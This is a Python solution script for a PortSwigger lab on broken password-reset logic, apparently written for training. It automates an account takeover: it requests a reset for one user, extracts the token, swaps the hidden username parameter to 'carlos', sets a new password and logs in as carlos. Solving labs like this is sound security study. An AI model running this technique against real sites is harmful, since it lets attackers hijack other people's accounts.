# Lab 03 — Password reset broken logic
# PortSwigger: https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic
#
# Vulnerability: The password reset POST includes a hidden 'username' parameter
#                the server trusts instead of validating the reset token against
#                the target account server-side
# Aim:           Reset carlos's password by changing the hidden username parameter
#
# Technique:
#   1. Request a password reset for YOUR OWN account (wiener)
#   2. Follow the reset link from the email client
#   3. Intercept the final POST — it contains username=wiener
#   4. Change username=wiener to username=carlos → carlos's password is reset
#
#   The reset token is never bound to the username server-side — if it were,
#   changing the username would cause a "token doesn't match this user" error.
#   Instead, the token is validated in isolation and the username is trusted.
#
# Usage: python authentication_lab03.py <url>

import sys
import re
import urllib3
from proxies import proxies
from authentication_utils import (banner, section, make_session, login,
                                   get_csrf_from_response, check_status, print_box)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

NEW_PASSWORD = "hacked123"

if __name__ == "__main__":
    banner()
    section("LAB 03 — PASSWORD RESET BROKEN LOGIC (HIDDEN USERNAME PARAMETER)")

    if len(sys.argv) != 2:
        print("  Usage: python authentication_lab03.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    # ── Step 1: request a password reset for wiener ───────────────────────────
    print("\n  ── Step 1: request a password reset for wiener\n")
    fp_page = session.get(f"{url}/forgot-password")
    csrf = get_csrf_from_response(fp_page.text)

    data = {"username": "wiener"}
    if csrf:
        data["csrf"] = csrf

    r = session.post(f"{url}/forgot-password", data=data, allow_redirects=True)
    check_status(r, 200, "POST /forgot-password for wiener")

    # ── Step 2: retrieve the reset link from the email client ─────────────────
    print("\n  ── Step 2: fetch the email client to get wiener's reset link\n")
    email_r = session.get(f"{url}/email")
    token_match = re.search(r'temp-forgot-password-token=([a-zA-Z0-9]+)', email_r.text)

    if not token_match:
        print("  ✘  Could not auto-extract reset token from /email")
        print("     Open the email client in a browser, copy the token from the link,")
        print("     and run the exploit manually using that token.")
        sys.exit(1)

    reset_token = token_match.group(1)
    print(f"  ✔  Reset token: {reset_token}\n")

    # ── Step 3: submit the reset form with username=carlos ─────────────────────
    print("  ── Step 3: submit password reset with username=carlos\n")
    reset_page = session.get(f"{url}/forgot-password", params={"temp-forgot-password-token": reset_token})
    reset_csrf = get_csrf_from_response(reset_page.text)

    reset_data = {
        "temp-forgot-password-token": reset_token,
        "username": "carlos",             # ← changed from wiener to carlos
        "new-password-1": NEW_PASSWORD,
        "new-password-2": NEW_PASSWORD,
    }
    if reset_csrf:
        reset_data["csrf"] = reset_csrf

    r2 = session.post(f"{url}/forgot-password", data=reset_data, allow_redirects=True)
    check_status(r2, 200, "POST /forgot-password with username=carlos")

    # ── Step 4: log in as carlos with the new password ────────────────────────
    print("\n  ── Step 4: log in as carlos with the new password\n")
    if login(session, url, username="carlos", password=NEW_PASSWORD):
        print_box("SUCCESS", f"carlos's password reset to: {NEW_PASSWORD}")
    else:
        print("  ✘  Login failed — the reset may not have worked or the form")
        print("     field names differ slightly on this lab instance.")
